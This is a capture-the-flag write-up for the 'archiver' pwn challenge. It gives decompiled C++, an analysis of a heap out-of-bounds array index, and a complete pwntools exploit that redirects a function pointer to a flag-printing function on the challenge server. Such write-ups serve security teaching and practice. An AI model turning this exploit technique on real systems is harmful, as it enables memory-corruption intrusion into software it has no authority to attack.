archiver
============

We are given `archiver` ELF file and `wrapper.py`. The python file is as below:
```python
import os
import sys
import md5
import random
import string
import subprocess
import signal
from struct import *

def rand_string(size=40):
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in xrange(size))

filename = "/tmp/dummy_" + rand_string()

def handler(signum, frame):
    delete()
    sys.exit(1)
    return

def delete():
    try:
        os.remove(filename)
    except:
        pass
    return

signal.signal(signal.SIGALRM, handler)
signal.alarm(10)

os.chdir("/home/archiver/")

FNULL = open(os.devnull, "rb")

size = unpack("<I", sys.stdin.read(4))[0]
if 4096 < size:
    print "Too big, Sorry!"
    sys.exit(1)

data = sys.stdin.read(size)
f = open(filename, "wb")
f.write(data)
f.close()

p = subprocess.Popen(["./archiver", filename], stdin=FNULL, stdout=subprocess.PIPE)
print(p.stdout.read())
delete()
```

The binary is programmed in C++. It has `Partial RELRO`, `NX` and `PIE` enabled.
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

We can analyze the decompiled code as below.


## Structures:

```C++
00000000 st_Compress     struc ; (sizeof=0x1B8, mappedto_9)
00000000 vtable          dq ?                    ; offset
00000008 filemanager     dq ?                    ; offset
00000010 cached_qwords   dq 48 dup(?)
00000190 buf             dq ?                    ; offset
00000198 buf_size        dq ?
000001A0 buf_offset_Q    dq ?
000001A8 written_bytes   dq ?
000001B0 print_uncomp_fsz dq ?                   ; offset
000001B8 st_Compress     ends

00000000 st_FileManager  struc ; (sizeof=0x18, mappedto_10)
00000000 vtable          dq ?                    ; offset
00000008 file_ifstream   dq ?
00000010 pos             dq ?
00000018 st_FileManager  ends

00000000 vtable_Compress struc ; (sizeof=0x48, mappedto_11)
00000000 anonymous_0     dq ?                    ; offset (00000000)
00000008 anonymous_1     dq ?                    ; offset (00000000)
00000010 set_fm_for_comp dq ?                    ; offset
00000018 do_compress     dq ?                    ; offset
00000020 fm_to_comp_Q    dq ?                    ; offset
00000028 cache_qword     dq ?                    ; offset
00000030 save_cached_qword_to_comp dq ?          ; offset
00000038 save_zeros_to_comp_Q dq ?               ; offset
00000040 save_to_comp    dq ?                    ; offset
00000048 vtable_Compress ends

00000000 vtable_FileManager struc ; (sizeof=0x28, mappedto_12)
00000000 anonymous_0     dq ?                    ; offset (00000000)
00000008 anonymous_1     dq ?                    ; offset (00000000)
00000010 open_ifstream   dq ?                    ; offset
00000018 read_from_fm    dq ?                    ; offset
00000020 anonymous_2     dq ?                    ; offset (00000000)
00000028 vtable_FileManager ends
```


## initializers:

```C++
void *__fastcall new_st_Compress(st_Compress *a1)
{
  void *result; // rax

  a1->vtable = (vtable_Compress *)(&`vtable for'Compress + 2);
  memset(a1->cached_qwords, 0, 0x180uLL);
  result = malloc(8uLL);
  a1->buf = result;
  a1->buf_size = 8LL;
  a1->buf_offset_Q = 0LL;
  a1->written_bytes = 0LL;
  return result;
}
```
```C++
__int64 *__fastcall new_st_FileManager(st_FileManager *a1)
{
  __int64 *result; // rax

  result = &`vtable for'FileManager + 2;
  a1->vtable = (vtable_FileManager *)(&`vtable for'FileManager + 2);
  a1->file_ifstream = 0LL;
  a1->pos = 0LL;
  return result;
}
```

## `main()`:
```C++
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char *v3; // ST68_8
  st_FileManager *v5; // [rsp+20h] [rbp-60h]
  st_Compress *v6; // [rsp+30h] [rbp-50h]
  unsigned int v7; // [rsp+7Ch] [rbp-4h]

  alarm(0x1Eu);
  v3 = a2[1];                                   // filename
  v6 = (st_Compress *)operator new(0x1B8uLL);
  new_st_Compress(v6);
  v6->print_uncomp_fsz = print_uncomp_fsz;
  v5 = (st_FileManager *)operator new(0x18uLL);
  new_st_FileManager(v5);
  if ( v5->vtable->open_ifstream(v5, v3) & 1 )
  {
    v6->vtable->set_fm_for_comp(v6, v5);
    if ( v6->vtable->do_compress(v6) & 1 )
    {
      v7 = 0;
    }
    else
    {
      printf("Error: Failed on process()\n");
      v6->print_uncomp_fsz(v6->written_bytes);
      v7 = 1;
    }
  }
  else
  {
    v7 = 1;
    printf("Error: Please contact admin\n");
  }
  return v7;
}
```

```C++
__int64 __fastcall open_ifstream(st_FileManager *a1, char *a2)
{
  __int64 v2; // ST10_8
  unsigned int flags; // ST0C_4

  v2 = operator new(0x208uLL);
  flags = uint32_or(8u, 4);
  std::basic_ifstream<char,std::char_traits<char>>::basic_ifstream(v2, (__int64)a2, flags);// std::ifstream v2(a2, flags)
  a1->file_ifstream = v2;
  return std::basic_ifstream<char,std::char_traits<char>>::is_open(a1->file_ifstream) & 1;
}
```

```C++
void __fastcall set_fm_for_comp(st_Compress *a1, st_FileManager *a2)
{
  a1->filemanager = a2;
}
```

```C++
int __fastcall print_uncomp_fsz(__int64 a1)
{
  return printf("Uncompressed file size is %p\n", a1);
}
```

`main()` simply initializes variables & opens our given file. The core is `do_compress()`, where our given file is read and processed through other functions.

## `do_compress()`:
```C++
__int64 __fastcall do_compress(st_Compress *a1)
{
  unsigned __int8 v2; // [rsp+6Ch] [rbp-24h]
  unsigned __int8 v3; // [rsp+6Dh] [rbp-23h]
  char v4; // [rsp+6Eh] [rbp-22h]
  unsigned __int8 v5; // [rsp+6Fh] [rbp-21h]
  unsigned __int64 v6; // [rsp+70h] [rbp-20h]
  __int64 magic; // [rsp+78h] [rbp-18h]
  st_Compress *v8; // [rsp+80h] [rbp-10h]
  char fail_if_zero; // [rsp+8Fh] [rbp-1h]

  v8 = a1;
  magic = 0LL;
  v6 = 0LL;
  if ( a1->filemanager->vtable->read_from_fm(a1->filemanager, (char *)&magic, 8) )
  {
    if ( magic == 0x393130322394D3C0LL )
    {
      if ( a1->filemanager->vtable->read_from_fm(a1->filemanager, (char *)&v6, 8) )
      {
        if ( v6 & 7 )                           // initial 8b after magic: for char k[8], (k[0] & 7) == 0 => maximum allowed buf_offset_Q (*8), thus aligned as 0x8
        {
          fail_if_zero = 0;
        }
        else
        {
          while ( 2 )
          {
            if ( 8 * a1->buf_offset_Q >= v6 )
            {
              fail_if_zero = 1;                 // terminate successfully if buf_offset_Q is larger than v6
            }
            else
            {
              a1->filemanager->vtable->read_from_fm(a1->filemanager, (char *)&v5, 1);// read 1 byte
              v4 = v5 >> 6;
              switch ( (unsigned __int64)(v5 >> 6) )// 2 MSBytes determine what to do
              {
                case 0uLL:
                  if ( a1->vtable->fm_to_comp_Q(a1, v5 & 0x3F) & 1 )// read (v5 & 0x3F) * 8 bytes from fm, save that to comp buf
                    continue;
                  fail_if_zero = 0;
                  break;
                case 1uLL:
                  v3 = v5 & 0x3F;
                  if ( a1->filemanager->vtable->read_from_fm(a1->filemanager, (char *)&v2, 1) )
                  {
                    if ( a1->vtable->cache_qword(a1, v3, v2) & 1 )  // heap overflow vulnerability
                      continue;
                    fail_if_zero = 0;
                  }
                  else
                  {
                    fail_if_zero = 0;
                  }
                  break;
                case 2uLL:
                  if ( a1->vtable->save_zeros_to_comp_Q(a1, v5 & 0x3F) & 1 )
                    continue;
                  fail_if_zero = 0;
                  break;
                case 3uLL:
                  v3 = v5 & 0x3F;
                  if ( a1->vtable->save_cached_qword_to_comp(a1, v5 & 0x3F) )
                    continue;
                  fail_if_zero = 0;
                  break;
                default:
                  fail_if_zero = 0;
                  break;
              }
            }
            break;
          }
        }
      }
      else
      {
        fail_if_zero = 0;
      }
    }
    else
    {
      printf("bad magic %p\n", magic);
      fail_if_zero = 0;
    }
  }
  else
  {
    fail_if_zero = 0;
  }
  return fail_if_zero & 1;
}
```

```C++
_BOOL8 __fastcall read_from_fm(st_FileManager *fm, char *buf, int bytes)
{
  std::istream *v3; // rax
  __int64 v4; // rax
  int v6; // [rsp+Ch] [rbp-14h]

  v6 = bytes;
  v3 = (std::istream *)std::istream::read((std::istream *)fm->file_ifstream, buf, bytes);
  v4 = std::basic_ios<char,std::char_traits<char>>::operator void *((char *)v3 + *(_QWORD *)(*(_QWORD *)v3 - 24LL));
  if ( v4 )
    fm->pos += v6;
  return v4 != 0;                               // return true on proper read
}
```

```C++
__int64 __fastcall fm_to_comp_Q(st_Compress *a1, unsigned __int8 a2)
{
  char v3[8]; // [rsp+20h] [rbp-20h]
  unsigned __int8 v4; // [rsp+2Eh] [rbp-12h]
  st_Compress *v6; // [rsp+30h] [rbp-10h]
  char fail_if_zero; // [rsp+3Fh] [rbp-1h]

  v6 = a1;
  while ( v4 < (signed int)a2 )
  {
    if ( !a1->filemanager->vtable->read_from_fm(a1->filemanager, v3, 8) )
    {
      fail_if_zero = 0;
      return fail_if_zero & 1;
    }
    if ( !(a1->vtable->save_to_comp(a1, v3, 8LL) & 1) )
    {
      fail_if_zero = 0;
      return fail_if_zero & 1;
    }
    ++v4;
  }
  fail_if_zero = 1;
  return fail_if_zero & 1;
}
```

```C++
__int64 __fastcall cache_qword(st_Compress *a1, unsigned __int8 a2, unsigned __int8 a3)
{
  char fail_if_zero; // [rsp+27h] [rbp-1h]

  if ( a1->buf_offset_Q >= (unsigned __int64)a3 )
  {
    a1->cached_qwords[a2] = *((_QWORD *)a1->buf + a1->buf_offset_Q - a3);// "proper" a3: [1, a1->buf_offset_Q]
    fail_if_zero = 1;
  }
  else
  {
    fail_if_zero = 0;
  }
  return fail_if_zero & 1;
}
```

```C++
_BOOL8 __fastcall save_cached_qword_to_comp(st_Compress *a1, unsigned __int8 a2)
{
  __int64 v3; // [rsp+0h] [rbp-20h]
  unsigned __int8 v4; // [rsp+Fh] [rbp-11h]
  st_Compress *v5; // [rsp+10h] [rbp-10h]

  v5 = a1;
  v4 = a2;
  v3 = a1->cached_qwords[a2];
  return (a1->vtable->save_to_comp(a1, &v3, 8LL) & 1) != 0;
}
```

```C++
__int64 __fastcall save_zeros_to_comp_Q(st_Compress *a1, unsigned __int8 a2)
{
  unsigned __int8 v3; // [rsp+1Fh] [rbp-21h]
  char v4[8]; // [rsp+20h] [rbp-20h]
  st_Compress *v6; // [rsp+30h] [rbp-10h]
  char fail_if_zero; // [rsp+3Fh] [rbp-1h]

  v6 = a1;
  *(_QWORD *)v4 = 0LL;
  while ( v3 < (signed int)a2 )
  {
    if ( !(a1->vtable->save_to_comp(a1, v4, 8LL) & 1) )
    {
      fail_if_zero = 0;
      return fail_if_zero & 1;
    }
    ++v3;
  }
  fail_if_zero = 1;
  return fail_if_zero & 1;
}
```

```C++
__int64 __fastcall save_to_comp(st_Compress *a1, const void *a2, size_t a3)
{
  unsigned __int64 v4; // [rsp+10h] [rbp-30h]
  size_t size; // [rsp+18h] [rbp-28h]
  size_t n; // [rsp+20h] [rbp-20h]
  char fail_if_zero; // [rsp+3Fh] [rbp-1h]

  n = a3;
  if ( a3 & 7 )
  {
    fail_if_zero = 0;
  }
  else
  {
    size = a3 + 8 * a1->buf_offset_Q;
    if ( size >= 8 * a1->buf_offset_Q )
    {
      while ( a1->buf_size < size )
      {
        if ( a1->buf )
        {
          v4 = 2 * a1->buf_size;
          if ( v4 < a1->buf_size )              // size overflowed
          {
            fail_if_zero = 0;
            return fail_if_zero & 1;
          }
          free(a1->buf);
          a1->buf = malloc(v4);                 // double the buffer size!
                                                // but wait, we didn't copy the data :P
          if ( !a1->buf )
          {
            fail_if_zero = 0;
            return fail_if_zero & 1;
          }
          a1->buf_size = v4;
        }
        else
        {
          a1->buf = malloc(size);
          if ( !a1->buf )
          {
            fail_if_zero = 0;
            return fail_if_zero & 1;
          }
          a1->buf_size = size;
        }
      }
      memcpy((char *)a1->buf + 8 * a1->buf_offset_Q, a2, n);
      a1->written_bytes += n;
      a1->buf_offset_Q += n >> 3;
      fail_if_zero = 1;
    }
    else                                        // size overflowed
    {
      fail_if_zero = 0;
    }
  }
  return fail_if_zero & 1;
}
```

And finally, our target function
## `cat_flag()`:
```C++
int cat_flag()
{
  return system("cat flag");
}
```

------------

Since this is C++, it may be frustrating at first to go through the initializers and deal with vtables. After some analysis, however, the vulnerability itself is quite obvious:
```C++
a1->vtable->cache_qword(a1, v3, v2)  // v3 = v5 & 0x3F
a1->vtable->save_cached_qword_to_comp(a1, v5 & 0x3F)
```
where `v5` is controlled by the attacker.  
The two funtions use the parameter `v5 & 0x3F` as follows:

```C++
__int64 __fastcall cache_qword(st_Compress *a1, unsigned __int8 a2, unsigned __int8 a3)
{
...
  if ( a1->buf_offset_Q >= (unsigned __int64)a3 )
  {
    a1->cached_qwords[a2] = *((_QWORD *)a1->buf + a1->buf_offset_Q - a3);
...

_BOOL8 __fastcall save_cached_qword_to_comp(st_Compress *a1, unsigned __int8 a2)
{
...
  v3 = a1->cached_qwords[a2];
  return (a1->vtable->save_to_comp(a1, &v3, 8LL) & 1) != 0;
}
```
So in the two functions, `0 <= a2 <= 0x3f`. But recall that `st_Compress->cached_qword` is only a `_QWORD` array of size `48` (equivalent to `0x30`). Thus we have an overflow vulnerability in heap area.

This vulnerability can be exploited to:
1. Overwrite data from `st_Compress->buf` to any variables of `st_Compress` with higher memory offset than `cached_qword`
2. Overwrite initially allocated `malloc(0x8)` heap memory of `st_Compress->buf`, a possible attack vector allowing some heap exploitation techniques
3. Overwrite `st_FileManager` completely
4. Read data from the above 1~3 overwrite targets and write it back to `st_Compress->buf`

Now we have info leak primitive with #4, and limited write primitive with #1~3. The restriction is that we can only input once, so we must use `st_Compress->buf` and `cached_qword` as storage.

The first approach was to fiddle with pointers such as `buf` or `buf_offset_Q` to overwrite only the least 2 bytes of function pointer of `st_Compress->print_uncomp_fsz`. This would let us forge the function pointer to `cat_flag()`, which we could then trigger some error to call the function. But this approach failed, since all functions operated on units of `_QWORD` (8 bytes). I couldn't manage to somehow increment or decrement `buf`, or any other variable, with offset not aligned to 8.

The second and successful approach was to use the odd-looking `st_Compress->written_bytes`. This variable is only incremented in `save_to_comp()`, and never used in any other functions. Thus I came up the idea of using this variable to increment the function pointer value of `st_Compress->print_uncomp_fsz` to `cat_flag()`. This is a feasible approach since functions are usually nicely aligned to 0x10, and the function offset was luckily `+0x1c0`.

The exploitation steps are as follows:
1. Save a lot of dummy data to `st_Compress->buf` using `save_zeros_to_comp_Q()`. This is to preallocate a lot of memory to the buffer, ensuring that it is not `free`d & `malloc`ed in later steps which could lead to loss of data.
2. Save `st_Compress->print_uncomp_fsz` to `st_Compress->buf` by `save_cached_qword_to_comp()`.
3. Save the above data from `st_Compress->buf` back to `st_Compress->written_bytes` by `cache_qword()`.
4. Save exactly `0x38` dummy `_QWORD`s to `st_Compress->buf` using `save_cached_qword_to_comp()` This increments `st_Compress->written_bytes` by `0x38 * 0x8 == 0x1c0`.
5. Save `st_Compress->written_bytes` to `st_Compress->buf` by `save_cached_qword_to_comp()`.
6. Save the above data from `st_Compress->buf` back to `st_Compress->print_uncomp_fsz` by `cache_qword()`.
7. Intentionally trigger an error case that returns with `fail_if_zero == 0` as in above code. I used `fm_to_comp_Q()` without supplying data to copy from file.

Below is the exploit code.
```python
from pwn import *

context.log_level = 'debug'

p = remote('110.10.147.111', 4141)

magic = 0x393130322394D3C0
max_buf_offset_Q = 0x1000000000

payload = ''
payload += p64(magic)
payload += p64(max_buf_offset_Q)

"""
0: fm_to_comp_Q
1: cache_qword
2: save_zeros_to_comp_Q
3: save_cached_qword_to_comp
"""

def fm_to_comp_Q(Q_count, fm_data):  # send data to comp buf
    assert(Q_count >= 0 and Q_count <= 0x3f and Q_count * 8 == len(fm_data))
    local_payload = ''
    local_payload += chr((0 << 6) | Q_count)
    local_payload += fm_data
    return local_payload

def cache_qword(cache_idx, buf_inv_offset_Q):  # save data from comp buf to cache
    assert(cache_idx >= 0 and cache_idx <= 0x3f)
    local_payload = ''
    local_payload += chr((1 << 6) | cache_idx)
    local_payload += chr(buf_inv_offset_Q)
    return local_payload

def save_zeros_to_comp_Q(Q_count):  # save zeros to comp buf
    assert(Q_count >= 0 and Q_count <= 0x3f)
    local_payload = ''
    local_payload += chr((2 << 6) | Q_count)
    return local_payload

def save_cached_qword_to_comp(Q_count):  # save cache to comp
    assert(Q_count >= 0 and Q_count <= 0x3f)
    local_payload = ''
    local_payload += chr((3 << 6) | Q_count)
    return local_payload

"""
initial heap structure:
st_Compress 0x1B8
st_Compress->buf 0x8
st_FileManager 0x18
st_FileManager->file_ifstream 0x208
"""

payload += save_zeros_to_comp_Q(0x3f) * 0x10
payload += save_cached_qword_to_comp(0x34)
payload += cache_qword(0x33, 1)
payload += save_cached_qword_to_comp(0) * 0x38  # offset 0x1c0 == 0x38 * 0x8
payload += save_cached_qword_to_comp(0x33)
payload += cache_qword(0x34, 1)
payload += chr((0 << 6) | 0x3f)  # fail fm_to_comp_Q

assert(len(payload) <= 4096)
payload = p32(len(payload)) + payload  # size prefix for wrapper

p.send(payload)

p.interactive()
```

**FLAG: `YouNeedReallyGoodBugToBreakASLR!!`**